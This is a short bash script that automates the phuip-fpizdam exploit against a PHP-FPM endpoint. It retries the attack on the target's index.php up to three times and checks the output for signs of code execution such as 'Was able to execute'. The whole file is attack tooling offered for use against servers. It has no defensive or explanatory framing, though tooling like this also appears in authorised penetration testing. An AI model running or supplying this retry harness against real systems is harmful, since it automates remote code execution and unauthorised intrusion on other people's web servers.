#!/bin/bash
# PHP-FPM — phuip-fpizdam with retry loop
# Usage: fpizdam_retry.sh <ENDPOINT>
set -euo pipefail

ENDPOINT="${1:?Usage: $0 <ENDPOINT>}"

for attempt in 1 2 3; do
  echo "[*] phuip-fpizdam 重试 #$attempt..."
  output=$(phuip-fpizdam "${ENDPOINT}/index.php" 2>&1)
  echo "$output"
  if echo "$output" | grep -qi "Success\|Attack params found\|Was able to execute"; then
    echo "FPIZDAM_SUCCESS"
    break
  fi
  sleep 2
done
